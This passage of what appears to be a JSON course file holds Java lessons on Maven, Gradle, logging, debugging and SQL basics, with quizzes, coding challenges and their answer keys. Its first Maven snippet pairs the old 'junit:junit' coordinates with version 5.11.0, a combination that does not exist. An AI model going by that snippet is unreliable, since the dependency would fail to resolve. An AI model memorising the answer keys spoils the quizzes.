              "content": "MAVEN is a build automation tool that:\n\n✓ Manages dependencies (downloads libraries)\n✓ Compiles your code\n✓ Runs tests\n✓ Packages your app (creates JAR file)\n✓ Enforces standard project structure\n\nInstead of:\n- \"Download JUnit JAR\"\n- \"Add to classpath\"\n- \"Hope it works\"\n\nYou write in pom.xml:\n<dependency>\n    <groupId>junit</groupId>\n    <artifactId>junit</artifactId>\n    <version>5.11.0</version>\n</dependency>\n\nMaven downloads it automatically! ✨"
            },
            {
              "type": "KEY_POINT",
              "title": "Maven is Like a Restaurant Manager",
              "content": "WITHOUT MAVEN (You're a cook doing everything):\n- Buy ingredients yourself\n- Track which suppliers have what\n- Check if ingredients are compatible\n- Organize kitchen yourself\n- Cook AND manage\n\nWITH MAVEN (Restaurant manager):\n- You tell manager: \"I need tomatoes, version 2.0\"\n- Manager orders from suppliers\n- Manager organizes kitchen layout\n- Manager ensures everything's in the right place\n- You just focus on cooking (coding)\n\nMaven handles the boring project management stuff!"
            },
            {
              "type": "THEORY",
              "title": "Maven Project Structure",
              "content": "Maven enforces a STANDARD structure:\n\nmy-project/\n├── pom.xml                 (Project config file)\n├── src/\n│   ├── main/\n│   │   ├── java/          (Your application code)\n│   │   │   └── com/yourcompany/App.java\n│   │   └── resources/     (Config files, properties)\n│   └── test/\n│       ├── java/          (Your test code)\n│       │   └── com/yourcompany/AppTest.java\n│       └── resources/     (Test resources)\n└── target/                 (Compiled output - Maven creates this)\n\nBENEFITS:\n✓ Every Maven project looks the same\n✓ New developers know where everything is\n✓ Tools work automatically\n\nThis is \"Convention Over Configuration\""
            },
            {
              "type": "THEORY",
              "title": "The pom.xml File - Project Object Model",
              "content": "pom.xml is the heart of a Maven project:\n\n<project>\n    <groupId>com.yourcompany</groupId>\n    <artifactId>my-app</artifactId>\n    <version>1.0.0</version>\n    \n    <properties>\n        <maven.compiler.source>23</maven.compiler.source>\n        <maven.compiler.target>23</maven.compiler.target>\n    </properties>\n    \n    <dependencies>\n        <dependency>\n            <groupId>org.junit.jupiter</groupId>\n            <artifactId>junit-jupiter</artifactId>\n            <version>5.11.0</version>\n            <scope>test</scope>\n        </dependency>\n    </dependencies>\n</project>\n\nKEY SECTIONS:\n- groupId: Your organization (like package)\n- artifactId: Project name\n- version: Your project version\n- properties: Configuration (Java version, etc.)\n- dependencies: External libraries you need"
            },
            {
              "type": "THEORY",
              "title": "Common Maven Commands",
              "content": "Run these from command line in project folder:\n\nmvn clean\n  → Deletes target/ folder (compiled output)\n\nmvn compile\n  → Compiles your main source code\n\nmvn test\n  → Compiles and runs all tests\n\nmvn package\n  → Compiles, tests, and creates JAR file\n\nmvn install\n  → Package and install to local repository\n\nmvn clean test\n  → Clean then test (combines commands)\n\nMOST COMMON WORKFLOW:\n1. Write code\n2. mvn clean test (verify tests pass)\n3. mvn package (create JAR)\n4. Deploy JAR to production"
            },
            {
              "type": "KEY_POINT",
              "title": "Maven Dependency Scopes",
              "content": "SCOPE controls WHEN a dependency is available:\n\n<scope>compile</scope> (default)\n  - Available everywhere (main code, tests, runtime)\n  - Example: Gson JSON library\n\n<scope>test</scope>\n  - Only for tests, not in final JAR\n  - Example: JUnit\n\n<scope>provided</scope>\n  - Available at compile-time, but server provides it at runtime\n  - Example: Servlet API (server like Tomcat has it)\n\n<scope>runtime</scope>\n  - Not needed for compilation, only at runtime\n  - Example: JDBC database driver\n\nRULE: Use test scope for testing libraries (saves space in final JAR)"
            },
            {
              "type": "THEORY",
              "title": "💻 Real pom.xml Example",
              "content": "```xml\n<?xml version=\"1.0\" encoding=\"UTF-8\"?>\n<project xmlns=\"http://maven.apache.org/POM/4.0.0\"\n         xmlns:xsi=\"http://www.w3.org/2001/XMLSchema-instance\"\n         xsi:schemaLocation=\"http://maven.apache.org/POM/4.0.0\n         http://maven.apache.org/xsd/maven-4.0.0.xsd\">\n    <modelVersion>4.0.0</modelVersion>\n\n    <groupId>com.example</groupId>\n    <artifactId>my-web-app</artifactId>\n    <version>1.0-SNAPSHOT</version>\n\n    <properties>\n        <maven.compiler.source>23</maven.compiler.source>\n        <maven.compiler.target>23</maven.compiler.target>\n    </properties>\n\n    <dependencies>\n        <!-- JSON parsing -->\n        <dependency>\n            <groupId>com.google.code.gson</groupId>\n            <artifactId>gson</artifactId>\n            <version>2.11.0</version>\n        </dependency>\n\n        <!-- Testing -->\n        <dependency>\n            <groupId>org.junit.jupiter</groupId>\n            <artifactId>junit-jupiter</artifactId>\n            <version>5.11.0</version>\n            <scope>test</scope>\n        </dependency>\n    </dependencies>\n</project>\n```"
            },
            {
              "type": "WARNING",
              "title": "Common Maven Pitfalls",
              "content": "AVOID THESE MISTAKES:\n\n1. NOT USING DEPENDENCY MANAGEMENT\n   In multi-module projects, use <dependencyManagement> to centralize versions.\n\n2. USING SNAPSHOT VERSIONS IN PRODUCTION\n   SNAPSHOT versions can change unexpectedly. Use release versions for production.\n\n3. NOT SPECIFYING ENCODING\n   Add <project.build.sourceEncoding>UTF-8</project.build.sourceEncoding> to properties.\n\n4. FORGETTING MAVEN WRAPPER\n   Use mvnw (Maven Wrapper) so all developers use the same Maven version.\n\n5. IGNORING DEPENDENCY CONFLICTS\n   Run 'mvn dependency:tree' to check for version conflicts."
            }
          ],
          "challenges": [
            {
              "type": "MULTIPLE_CHOICE",
              "id": "lesson-8-4-maven-commands",
              "title": "Maven Commands",
              "description": "Which Maven command compiles code, runs tests, and creates a JAR file?",
              "options": [
                "mvn compile",
                "mvn test",
                "mvn package",
                "mvn install"
              ],
              "correctAnswer": 2,
              "explanation": "mvn package runs the full lifecycle: compile -> test -> package (create JAR). mvn install goes further by copying to local repository."
            }
          ]
        },
        {
          "id": "epoch-4-lesson-5-gradle",
          "title": "Lesson 8.5: Build Automation with Gradle",
          "moduleId": "module-08",
          "order": 5,
          "estimatedMinutes": 35,
          "difficulty": "intermediate",
          "contentSections": [
            {
              "type": "THEORY",
              "title": "Gradle vs Maven",
              "content": "WHY GRADLE EXISTS:\n\nMaven solved dependency management, but developers wanted:\n- FLEXIBILITY: Groovy/Kotlin scripts instead of rigid XML\n- SPEED: Incremental builds, build cache, parallel execution\n- MODERN DSL: Kotlin DSL with type safety and IDE support\n\nGRADLE ADVANTAGES:\n✓ Faster builds (caches everything)\n✓ Flexible scripting (Groovy or Kotlin)\n✓ Better IDE integration\n✓ Required for Android development\n\nWHEN TO USE WHICH:\n- Android development → GRADLE (required)\n- Legacy enterprise → MAVEN (existing projects)\n- New projects → Either (Gradle slightly preferred)\n- Simple libraries → MAVEN (simpler config)\n\nGradle is like Maven 2.0 - same concepts, better execution."
            },
            {
              "type": "EXAMPLE",
              "title": "build.gradle.kts Structure",
              "content": "A Gradle build file defines plugins, repositories, dependencies, and application config. Notice how much shorter it is than Maven's pom.xml! Plugins define build behavior, repositories specify where to download dependencies, and the application block configures how to run your app.",
              "code": "plugins {\n    kotlin(\"jvm\") version \"2.1.0\"\n    application\n}\n\nrepositories {\n    mavenCentral()\n}\n\ndependencies {\n    implementation(\"com.google.guava:guava:32.1.2-jre\")\n    testImplementation(kotlin(\"test\"))\n}\n\napplication {\n    mainClass.set(\"MainKt\")\n}",
              "language": "kotlin"
            },
            {
              "type": "KEY_POINT",
              "title": "Kotlin DSL vs Groovy",
              "content": "TWO WAYS TO WRITE GRADLE FILES:\n\nKOTLIN DSL (.gradle.kts):\nplugins {\n    kotlin(\"jvm\") version \"2.1.0\"\n}\ndependencies {\n    implementation(\"com.google.guava:guava:32.1.2-jre\")\n}\n\nGROOVY DSL (.gradle):\nplugins {\n    id 'org.jetbrains.kotlin.jvm' version '2.1.0'\n}\ndependencies {\n    implementation 'com.google.guava:guava:32.1.2-jre'\n}\n\nWHY KOTLIN DSL IS PREFERRED:\n✓ Type safety (IDE catches errors)\n✓ Better autocomplete in IntelliJ\n✓ Easier refactoring\n✓ More readable for Kotlin developers\n\nMost new projects use Kotlin DSL (.gradle.kts)"
            },
            {
              "type": "EXAMPLE",
              "title": "Common Gradle Tasks",
              "content": "Gradle tasks are run from the command line using ./gradlew. Common tasks include: build (compile, test, package), test (run tests), run (execute app), dependencies (show dependency tree), clean (delete build folder), and tasks (list available tasks). You can also create custom tasks.",
              "code": "# Common Gradle commands:\n./gradlew build        # Compiles, tests, and packages\n./gradlew test         # Runs all tests\n./gradlew run          # Runs your application\n./gradlew dependencies # Shows dependency tree\n./gradlew clean        # Deletes build directory\n./gradlew tasks        # Lists all available tasks\n\n# Creating a custom task in build.gradle.kts:\ntasks.register(\"hello\") {\n    doLast {\n        println(\"Hello from Gradle!\")\n    }\n}\n\n# Run with:\n./gradlew hello",
              "language": "kotlin"
            },
            {
              "type": "KEY_POINT",
              "title": "Converting Maven to Gradle",
              "content": "AUTOMATIC CONVERSION:\n\n# In your Maven project directory:\ngradle init --type pom\n\nThis reads pom.xml and creates:\n- build.gradle.kts (or build.gradle)\n- settings.gradle.kts\n- gradlew (wrapper script)\n\nMANUAL MAPPING:\n\nMaven pom.xml → Gradle build.gradle.kts:\n\n<groupId> → group = \"com.example\"\n<artifactId> → (in settings.gradle.kts: rootProject.name)\n<version> → version = \"1.0.0\"\n<dependencies> → dependencies { }\n<build><plugins> → plugins { }\n\nDEPENDENCY SCOPES:\nMaven compile → Gradle implementation\nMaven test → Gradle testImplementation\nMaven provided → Gradle compileOnly\nMaven runtime → Gradle runtimeOnly"
            },
            {
              "type": "KEY_POINT",
              "title": "Gradle Wrapper",
              "content": "ALWAYS USE THE WRAPPER!\n\nCORRECT: ./gradlew build\nWRONG: gradle build\n\nWHY?\n- Wrapper ensures EVERYONE uses same Gradle version\n- No need to install Gradle separately\n- Works on any machine with Java\n\nFILES CREATED:\n- gradlew (Unix script)\n- gradlew.bat (Windows script)\n- gradle/wrapper/gradle-wrapper.jar\n- gradle/wrapper/gradle-wrapper.properties\n\nCOMMIT THESE TO GIT!\nTeammates don't need Gradle installed.\n\nUPDATING WRAPPER VERSION:\n./gradlew wrapper --gradle-version 8.11"
            },
            {
              "type": "WARNING",
              "title": "Common Gradle Pitfalls",
              "content": "AVOID THESE MISTAKES:\n\n1. NOT USING THE WRAPPER\n   Always use ./gradlew instead of gradle to ensure consistent versions.\n\n2. MIXING GROOVY AND KOTLIN DSL\n   Pick one and stick with it. Kotlin DSL (.gradle.kts) is recommended for new projects.\n\n3. APPLYING PLUGINS THE OLD WAY\n   Use plugins { } block, not apply plugin: 'java' (deprecated).\n\n4. NOT CONFIGURING TEST PLATFORM\n   For JUnit 5, add tasks.test { useJUnitPlatform() }.\n\n5. COMMITTING .gradle FOLDER\n   Add .gradle/ to .gitignore - it contains local cache files."
            }
          ],
          "challenges": [
            {
              "id": "gradle-project-setup",
              "title": "Create Gradle Project",
              "type": "coding",
              "difficulty": "beginner",
              "instructions": "Create a build.gradle.kts file that:\n1. Uses the Java plugin\n2. Sets Java version to 23\n3. Adds JUnit 5 as a test dependency\n4. Configures the test task to use JUnit Platform",
              "starterCode": "// build.gradle.kts\n// Add your configuration here\n",
              "solution": "plugins {\n    java\n}\n\ngroup = \"com.example\"\nversion = \"1.0.0\"\n\njava {\n    toolchain {\n        languageVersion.set(JavaLanguageVersion.of(23))\n    }\n}\n\nrepositories {\n    mavenCentral()\n}\n\ndependencies {\n    testImplementation(\"org.junit.jupiter:junit-jupiter:5.11.0\")\n}\n\ntasks.test {\n    useJUnitPlatform()\n}",
              "hints": [
                {
                  "level": 1,
                  "text": "Use the 'java' plugin for Java projects"
                },
                {
                  "level": 2,
                  "text": "JUnit 5 dependency is 'org.junit.jupiter:junit-jupiter'"
                },
                {
                  "level": 3,
                  "text": "useJUnitPlatform() tells Gradle to use JUnit 5"
                }
              ],
              "testCases": []
            },
            {
              "id": "gradle-custom-task",
              "title": "Add Custom Task",
              "type": "coding",
              "difficulty": "beginner",
              "instructions": "Add a custom Gradle task called 'projectInfo' that prints:\n1. Project name\n2. Project version\n3. Java version being used\n\nThe output should be formatted nicely.",
              "starterCode": "// Add to build.gradle.kts\n\ntasks.register(\"projectInfo\") {\n    // Your code here\n}",
              "solution": "tasks.register(\"projectInfo\") {\n    group = \"help\"\n    description = \"Displays project information\"\n    \n    doLast {\n        println(\"================================\")\n        println(\"Project Information\")\n        println(\"================================\")\n        println(\"Name: ${project.name}\")\n        println(\"Version: ${project.version}\")\n        println(\"Java Version: ${java.toolchain.languageVersion.get()}\")\n        println(\"================================\")\n    }\n}",
              "hints": [
                {
                  "level": 1,
                  "text": "Use doLast { } to define what the task does"
                },
                {
                  "level": 2,
                  "text": "Access project properties with 'project.name', 'project.version'"
                },
                {
                  "level": 3,
                  "text": "Use string templates with ${} for interpolation"
                }
              ],
              "testCases": []
            }
          ]
        },
        {
          "id": "epoch-4-lesson-6",
          "title": "Lesson 8.6: Debugging, Logging, and Professional Habits",
          "moduleId": "module-08",
          "order": 6,
          "estimatedMinutes": 40,
          "difficulty": "intermediate",
          "contentSections": [
            {
              "type": "THEORY",
              "title": "The Problem: System.out.println() Everywhere",
              "content": "Beginner debugging:\n\npublic void processOrder(Order order) {\n    System.out.println(\"Got order: \" + order);  // Debug line\n    calculateTotal(order);\n    System.out.println(\"Total: \" + order.getTotal());  // Debug line\n    saveToDatabase(order);\n    System.out.println(\"Saved!\");  // Debug line\n}\n\nPROBLEMS:\n❌ Output mixed with actual program output\n❌ Can't turn debug messages off easily\n❌ No way to filter by severity (error vs info)\n❌ Forgot to remove debug prints before release\n❌ No timestamps or context\n\nProfessional solution: LOGGING FRAMEWORKS"
            },
            {
              "type": "THEORY",
              "title": "Logging with SLF4J and Logback",
              "content": "LOGGING = Structured way to record what's happening\n\nimport org.slf4j.Logger;\nimport org.slf4j.LoggerFactory;\n\npublic class OrderService {\n    private static final Logger logger = \n        LoggerFactory.getLogger(OrderService.class);\n    \n    public void processOrder(Order order) {\n        logger.info(\"Processing order: {}\", order.getId());\n        \n        try {\n            calculateTotal(order);\n            saveToDatabase(order);\n            logger.info(\"Order {} processed successfully\", order.getId());\n        } catch (Exception e) {\n            logger.error(\"Failed to process order {}\", order.getId(), e);\n        }\n    }\n}\n\nLOGGING LEVELS (in order):\nTRACE - Very detailed, rarely used\nDEBUG - Development information\nINFO - General information (\"Server started\")\nWARN - Something unexpected, but not critical\nERROR - Something failed\n\nProduction: Only show WARN and ERROR\nDevelopment: Show DEBUG and above"
            },
            {
              "type": "THEORY",
              "title": "Using a Debugger - The Professional's Tool",
              "content": "Instead of println, use your IDE's DEBUGGER:\n\nKEY FEATURES:\n\n1. BREAKPOINTS\n   - Click next to line number (red dot appears)\n   - Program PAUSES when it reaches that line\n   - Inspect ALL variables at that moment\n\n2. STEP THROUGH CODE\n   - Step Over: Execute current line, move to next\n   - Step Into: Go inside method call\n   - Step Out: Finish current method, return to caller\n\n3. WATCH VARIABLES\n   - See how variables change\n   - Evaluate expressions on-the-fly\n\n4. CALL STACK\n   - See path of method calls\n   - Navigate to any point\n\nDEBUGGING WORKFLOW:\n1. Set breakpoint where problem might be\n2. Run in debug mode\n3. When paused, inspect variables\n4. Step through code line by line\n5. Watch how values change\n6. Identify where logic goes wrong"
            },
            {
              "type": "ANALOGY",
              "title": "Logging vs Debugging",
              "content": "LOGGING = Security cameras:\n- Always recording\n- Review footage after incident\n- See what happened over time\n- Good for: production issues, patterns\n\nExample:\n\"Why did the server crash at 3am?\"\n→ Check logs for ERROR messages at that time\n\nDEBUGGING = Live investigation:\n- Stop and examine everything NOW\n- Step-by-step analysis\n- Immediate feedback\n- Good for: development, understanding flow\n\nExample:\n\"Why is calculateTotal() returning wrong value?\"\n→ Set breakpoint, inspect variables, step through logic\n\nUSE BOTH!"
            },
            {
              "type": "THEORY",
              "title": "Writing Good Documentation",
              "content": "JAVADOC = Standard way to document Java code\n\n/**\n * Calculates the total price including tax.\n * \n * @param subtotal The price before tax\n * @param taxRate The tax rate as decimal (0.08 for 8%)\n * @return The total price including tax\n * @throws IllegalArgumentException if subtotal is negative\n */\npublic double calculateTotal(double subtotal, double taxRate) {\n    if (subtotal < 0) {\n        throw new IllegalArgumentException(\"Subtotal cannot be negative\");\n    }\n    return subtotal * (1 + taxRate);\n}\n\nJAVADOC TAGS:\n@param - Describes a parameter\n@return - Describes return value\n@throws - Describes exceptions thrown\n@see - Links to related code\n@since - When this was added\n@deprecated - Mark as obsolete\n\nWHEN TO WRITE DOCS:\n✓ Public methods/classes (API)\n✓ Complex algorithms\n✓ Non-obvious behavior\n✗ Self-explanatory code\n✗ Private helper methods (usually)"
            },
            {
              "type": "KEY_POINT",
              "title": "Professional Coding Habits",
              "content": "1. USE VERSION CONTROL (Git)\n   - Commit frequently\n   - Write meaningful commit messages\n   - \"Fixed bug\" ✗\n   - \"Fix NullPointerException in user login when email is empty\" ✓\n\n2. CODE REVIEWS\n   - Have others review your code\n   - Catches bugs, improves quality\n   - Learn from feedback\n\n3. CONSISTENT FORMATTING\n   - Use IDE auto-format (Ctrl+Alt+L in IntelliJ)\n   - Follow team style guide\n   - Consistent = readable\n\n4. MEANINGFUL NAMES\n   - int d; ✗\n   - int daysSinceCreation; ✓\n\n5. SMALL COMMITS\n   - One logical change per commit\n   - Easy to review and revert\n\n6. TEST BEFORE PUSHING\n   - Always run tests\n   - Don't break the build for teammates\n\n7. CONTINUOUS LEARNING\n   - Read others' code\n   - Stay updated on best practices\n   - Refactor as you learn"
            },
            {
              "type": "EXAMPLE",
              "title": "Real Logging Example",
              "content": "A proper logging setup using SLF4J with different log levels for authentication flow.",
              "code": "import org.slf4j.Logger;\nimport org.slf4j.LoggerFactory;\n\npublic class UserService {\n    private static final Logger logger = \n        LoggerFactory.getLogger(UserService.class);\n\n    public User authenticateUser(String username, String password) {\n        logger.debug(\"Attempting authentication for user: {}\", username);\n        \n        User user = userRepository.findByUsername(username);\n        \n        if (user == null) {\n            logger.warn(\"Authentication failed: user not found - {}\", username);\n            return null;\n        }\n        \n        if (!passwordMatches(user, password)) {\n            logger.warn(\"Authentication failed: incorrect password for {}\", username);\n            return null;\n        }\n        \n        logger.info(\"User {} authenticated successfully\", username);\n        return user;\n    }\n}\n\n// OUTPUT (with timestamps automatically added):\n// 2025-01-15 10:30:15 DEBUG UserService - Attempting authentication for user: alice\n// 2025-01-15 10:30:15 INFO UserService - User alice authenticated successfully",
              "language": "java"
            },
            {
              "type": "WARNING",
              "title": "Debugging and Logging Pitfalls",
              "content": "AVOID THESE MISTAKES:\n\n1. LEAVING DEBUG PRINTLNS IN CODE\n   Remove System.out.println() before committing. Use proper logging instead.\n\n2. LOGGING SENSITIVE DATA\n   NEVER log passwords, credit cards, or personal data. Logs can be accessed by many people.\n\n3. NOT LOGGING ENOUGH CONTEXT\n   Bad: logger.error(\"Failed\")\n   Good: logger.error(\"Failed to process order {} for user {}\", orderId, userId)\n\n4. IGNORING EXCEPTION STACK TRACES\n   Always include the exception: logger.error(\"Error processing\", exception)\n\n5. DEBUGGING IN PRODUCTION\n   Use logging for production issues. Debuggers are for development only."
            }
          ],
          "challenges": [
            {
              "type": "MULTIPLE_CHOICE",
              "id": "lesson-8-6-logging",
              "title": "Logging Best Practices",
              "description": "Which logging level should you use for 'User logged in successfully'?",
              "options": [
                "DEBUG - it's implementation detail",
                "INFO - it's a normal business event",
                "WARN - something might be wrong",
                "ERROR - something failed"
              ],
              "correctAnswer": 1,
              "explanation": "INFO is for normal, significant business events. DEBUG is for development details. WARN/ERROR are for problems."
            }
          ]
        }
      ],
      "order": 8
    },
    {
      "id": "module-06",
      "title": "Databases and SQL",
      "description": "Learn SQL fundamentals, JDBC for raw database access, JPA/Hibernate for object-relational mapping, and Flyway for database migrations.",
      "difficulty": "beginner",
      "estimatedHours": 4.8,
      "lessons": [
        {
          "id": "epoch-5-lesson-1",
          "title": "Lesson 9.1: Why Do We Need Databases?",
          "moduleId": "module-06",
          "order": 1,
          "estimatedMinutes": 30,
          "difficulty": "intermediate",
          "contentSections": [
            {
              "type": "THEORY",
              "title": "The Problem: Data Disappears",
              "content": "Your program can store data in variables and arrays:\n\nArrayList<Student> students = new ArrayList<>();\nstudents.add(new Student(\"Alice\", 20));\n\nBut when the program ends... POOF! All data is gone.\n\nNext time you run it, you start from scratch.\n\nReal applications need PERSISTENCE:\n- User accounts must survive restarts\n- Orders must be saved\n- Posts, messages, files must persist\n\nThis is why we need DATABASES."
            },
            {
              "type": "KEY_POINT",
              "title": "Databases are Like Libraries",
              "content": "Your program's memory (variables) = Your desk\n- Fast access\n- Limited space\n- Temporary (clear when you leave)\n\nA database = A library\n- Massive storage\n- Organized (card catalog)\n- Permanent (survives computer shutdowns)\n- Shared (multiple programs can access)\n\nYou work with data on your desk (RAM), but save important things to the library (database)."
            },
            {
              "type": "THEORY",
              "title": "SQL - The Database Language",
              "content": "SQL (Structured Query Language) is how you talk to databases.\n\nFour essential operations (CRUD):\n\nCREATE (Insert data):\nINSERT INTO students (name, age) VALUES ('Alice', 20);\n\nREAD (Query data):\nSELECT * FROM students WHERE age > 18;\n\nUPDATE (Modify data):\nUPDATE students SET age = 21 WHERE name = 'Alice';\n\nDELETE (Remove data):\nDELETE FROM students WHERE age < 18;"
            },
            {
              "type": "WARNING",
              "title": "Database Operations Are Permanent",
              "content": "Unlike variables in your program, database changes are PERMANENT:\n\n- DELETE removes data forever (unless you have backups)\n- UPDATE cannot be undone without restoring from backup\n- No Ctrl+Z in production databases!\n\nALWAYS:\n- Test queries on development data first\n- Back up data before running DELETE or UPDATE\n- Use WHERE clauses carefully - forgetting WHERE deletes ALL rows\n- In production, use transactions so you can rollback mistakes"
            }
          ],
          "challenges": [
            {
              "type": "MULTIPLE_CHOICE",
              "id": "lesson-9-1-persistence",
              "title": "Why Databases?",
              "description": "Why can't we just use variables to store user data permanently?",
              "options": [
                "Variables are too slow",
                "Variables only exist while the program runs",
                "Variables can only store numbers",
                "Variables are not secure"
              ],
              "correctAnswer": 1,
              "explanation": "Variables exist in RAM (memory) and disappear when the program ends. Databases store data on disk permanently."
            }
          ]
        },
        {
          "id": "epoch-5-lesson-2",
          "title": "Lesson 9.2: SQL Basics - Your First Database",
          "moduleId": "module-06",
          "order": 2,
          "estimatedMinutes": 40,
          "difficulty": "intermediate",
          "contentSections": [
            {
              "type": "THEORY",
              "title": "Creating a Table - The Foundation",
              "content": "Before storing data, you need a TABLE (like a spreadsheet):\n\nCREATE TABLE students (\n    id INT PRIMARY KEY AUTO_INCREMENT,\n    name VARCHAR(100) NOT NULL,\n    age INT,\n    email VARCHAR(255) UNIQUE,\n    gpa DECIMAL(3, 2)\n);\n\nBREAKING IT DOWN:\n- id: Unique identifier for each student\n- PRIMARY KEY: This field uniquely identifies each row\n- AUTO_INCREMENT: Database automatically assigns 1, 2, 3...\n- VARCHAR(100): Text up to 100 characters\n- NOT NULL: This field is required (can't be empty)\n- UNIQUE: No two students can have the same email\n- DECIMAL(3, 2): Numbers like 3.75 (3 total digits, 2 after decimal)"
            },
            {
              "type": "THEORY",
              "title": "Common Data Types in SQL",
              "content": "TEXT TYPES:\n- CHAR(n): Fixed-length text (CHAR(5) for \"HELLO\")\n- VARCHAR(n): Variable-length text (VARCHAR(255) for emails)\n- TEXT: Very long text (articles, comments)\n\nNUMBER TYPES:\n- INT: Whole numbers (-2147483648 to 2147483647)\n- BIGINT: Bigger whole numbers\n- DECIMAL(p, s): Exact decimals (DECIMAL(10, 2) for money: 12345678.90)\n- FLOAT/DOUBLE: Approximate decimals (scientific calculations)\n\nDATE/TIME TYPES:\n- DATE: Just date (2025-01-15)\n- TIME: Just time (14:30:00)\n- DATETIME: Both (2025-01-15 14:30:00)\n- TIMESTAMP: Date + time with timezone\n\nBOOLEAN:\n- BOOLEAN: true/false (stored as 0 or 1)"
            },
            {
              "type": "THEORY",
              "title": "Inserting Data - Adding Rows",
              "content": "INSERT INTO table_name (columns) VALUES (values);\n\nSINGLE ROW:\nINSERT INTO students (name, age, email, gpa)\nVALUES ('Alice Johnson', 20, 'alice@example.com', 3.75);\n\nMULTIPLE ROWS:\nINSERT INTO students (name, age, email, gpa) VALUES\n    ('Bob Smith', 21, 'bob@example.com', 3.50),\n    ('Carol Davis', 19, 'carol@example.com', 3.90),\n    ('Dave Wilson', 22, 'dave@example.com', 3.25);\n\nAUTO_INCREMENT ID:\nNotice we didn't specify 'id' - database assigns it automatically!\n\nNULL VALUES:\nINSERT INTO students (name, age) VALUES ('Eve', 20);\n// email and gpa will be NULL"
            },
            {
              "type": "THEORY",
              "title": "Selecting Data - Querying Tables",
              "content": "SELECT columns FROM table WHERE conditions;\n\nGET EVERYTHING:\nSELECT * FROM students;\n// * means \"all columns\"\n\nSPECIFIC COLUMNS:\nSELECT name, gpa FROM students;\n\nWITH CONDITIONS:\nSELECT * FROM students WHERE age >= 21;\nSELECT * FROM students WHERE gpa > 3.5;\nSELECT name FROM students WHERE email LIKE '%gmail.com';\n\nCOMBINING CONDITIONS:\nSELECT * FROM students WHERE age > 20 AND gpa > 3.0;\nSELECT * FROM students WHERE age < 20 OR gpa > 3.8;"
            },
            {
              "type": "KEY_POINT",
              "title": "Tables are Like Spreadsheets",
              "content": "Excel spreadsheet:\n| ID | Name          | Age | Email              | GPA  |\n|----|---------------|-----|--------------------| -----|\n| 1  | Alice Johnson | 20  | alice@example.com  | 3.75 |\n| 2  | Bob Smith     | 21  | bob@example.com    | 3.50 |\n| 3  | Carol Davis   | 19  | carol@example.com  | 3.90 |\n\nDatabase table = Same thing!\n- Each ROW = One student\n- Each COLUMN = One property\n- Each CELL = One value\n\nSQL just lets you manipulate this \"spreadsheet\" with commands."
            },
            {
              "type": "KEY_POINT",
              "title": "Primary Keys - The Unique Identifier",
              "content": "Every table should have a PRIMARY KEY:\n\nWHY?\n- Uniquely identifies each row\n- Prevents duplicate entries\n- Allows referencing from other tables\n\nGOOD PRIMARY KEYS:\n✓ id INT AUTO_INCREMENT\n✓ email (if truly unique)\n✓ username (if truly unique)\n\nBAD PRIMARY KEYS:\n✗ name (not unique - many \"John Smith\"s)\n✗ age (definitely not unique)\n\nBEST PRACTICE:\nAlways use an auto-incrementing ID as primary key.\nSimple, guaranteed unique, fast."
            },
            {
              "type": "WARNING",
              "title": "Common SQL Mistakes to Avoid",
              "content": "1. FORGETTING NOT NULL:\n   - Fields without NOT NULL can have empty values\n   - Required fields should always have NOT NULL\n\n2. WRONG DATA TYPES:\n   - Using VARCHAR for numbers = slow sorting, bad comparisons\n   - Using FLOAT for money = rounding errors (use DECIMAL instead)\n\n3. DUPLICATE DATA:\n   - Storing same data in multiple tables = inconsistency\n   - Use foreign keys and JOINs instead\n\n4. NO PRIMARY KEY:\n   - Every table needs a PRIMARY KEY\n   - Without it, you cannot uniquely identify rows\n\n5. SELECT * IN PRODUCTION:\n   - Retrieves all columns, even unused ones\n   - Wastes bandwidth and memory\n   - Always specify needed columns: SELECT name, age FROM..."
            }
          ],
          "challenges": [
            {
              "type": "MULTIPLE_CHOICE",
              "id": "lesson-9-2-create-table",
              "title": "SQL CREATE TABLE",
              "description": "Which SQL keyword defines a column that cannot contain NULL values?",
              "options": [
                "REQUIRED",
                "NOT NULL",
                "MANDATORY",
                "NO_EMPTY"
              ],
              "correctAnswer": 1,
              "explanation": "NOT NULL is the SQL constraint that prevents a column from containing NULL values."
            }
          ]
        },
        {
          "id": "epoch-5-lesson-3",
          "title": "Lesson 9.3: SQL Queries - Filtering, Sorting, and Aggregating",
          "moduleId": "module-06",
          "order": 3,
          "estimatedMinutes": 40,
          "difficulty": "intermediate",
          "contentSections": [
            {
              "type": "THEORY",
              "title": "WHERE Clause - Filtering Rows",
              "content": "The WHERE clause filters which rows to return:\n\nCOMPARISON OPERATORS:\nSELECT * FROM students WHERE age = 21;      // Equal\nSELECT * FROM students WHERE age != 21;     // Not equal\nSELECT * FROM students WHERE age > 20;      // Greater than\nSELECT * FROM students WHERE age >= 20;     // Greater or equal\nSELECT * FROM students WHERE age BETWEEN 18 AND 22;\n\nPATTERN MATCHING:\nSELECT * FROM students WHERE name LIKE 'A%';      // Starts with A\nSELECT * FROM students WHERE email LIKE '%gmail.com';  // Ends with gmail.com\nSELECT * FROM students WHERE name LIKE '%son%';   // Contains 'son'\n\nNULL CHECKS:\nSELECT * FROM students WHERE email IS NULL;\nSELECT * FROM students WHERE email IS NOT NULL;\n\nIN OPERATOR:\nSELECT * FROM students WHERE age IN (18, 19, 20);\nSELECT * FROM students WHERE name IN ('Alice', 'Bob', 'Carol');"
            },
            {
              "type": "THEORY",
              "title": "ORDER BY - Sorting Results",
              "content": "ORDER BY sorts results:\n\nASCENDING (default):\nSELECT * FROM students ORDER BY age;\nSELECT * FROM students ORDER BY name ASC;\n\nDESCENDING:\nSELECT * FROM students ORDER BY gpa DESC;\n\nMULTIPLE COLUMNS:\nSELECT * FROM students ORDER BY age ASC, gpa DESC;\n// Sort by age first, then by GPA within same age\n\nLIMIT - Restricting Results:\nSELECT * FROM students ORDER BY gpa DESC LIMIT 5;\n// Top 5 students by GPA\n\nOFFSET:\nSELECT * FROM students LIMIT 10 OFFSET 20;\n// Skip first 20 results, then get 10\n// Useful for pagination!"
            },
            {
              "type": "THEORY",
              "title": "Aggregate Functions - Calculations",
              "content": "Calculate values across multiple rows:\n\nCOUNT - How many rows:\nSELECT COUNT(*) FROM students;\nSELECT COUNT(*) FROM students WHERE age > 20;\n\nSUM - Total of all values:\nSELECT SUM(age) FROM students;\n\nAVG - Average:\nSELECT AVG(gpa) FROM students;\n\nMIN and MAX:\nSELECT MIN(age) FROM students;\nSELECT MAX(gpa) FROM students;\n\nCOMBINING:\nSELECT \n    COUNT(*) as total_students,\n    AVG(gpa) as average_gpa,\n    MIN(age) as youngest,\n    MAX(age) as oldest\nFROM students;"
            },
            {
              "type": "THEORY",
